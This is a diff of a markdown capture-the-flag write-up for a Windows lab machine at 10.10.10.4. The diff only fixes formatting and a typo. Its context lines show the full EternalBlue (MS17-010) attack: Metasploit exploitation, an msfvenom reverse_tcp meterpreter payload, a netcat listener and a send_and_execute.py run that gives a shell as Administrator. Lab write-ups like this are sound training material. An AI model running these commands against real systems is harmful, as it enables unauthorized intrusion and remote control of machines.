@@ -65,7 +65,7 @@ msf> set lhost <local_ip>
 msf> exploit
 ```
 
-We have a meterpreter session opening and it looks like we are 'Administrator'.
+We have a meterpreter session opening and it looks like we are `Administrator`.
 
 We can get the user flag in `C:\Documents and Settings\john\Desktop\user.txt`.
 
@@ -83,19 +83,19 @@ We clone the Github repository :
 git clone https://github.com/helviojunior/MS17-010
 ```
 
-We generate a payload with 'msfvenom' :
+We generate a payload with `msfvenom` :
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=1234 -f exe > eternablue.exe
 ```
 
-Start a nencat listener on the specified port :
+Start a netcat listener on the specified port :
 
 ```
 nc -lnvp 1234
 ```
 
-And run the script 'send_and_execute.py' :
+And run the script `send_and_execute.py` :
 
 ```
 python send_and_execute.py 10.10.10.4 eternablue.exe
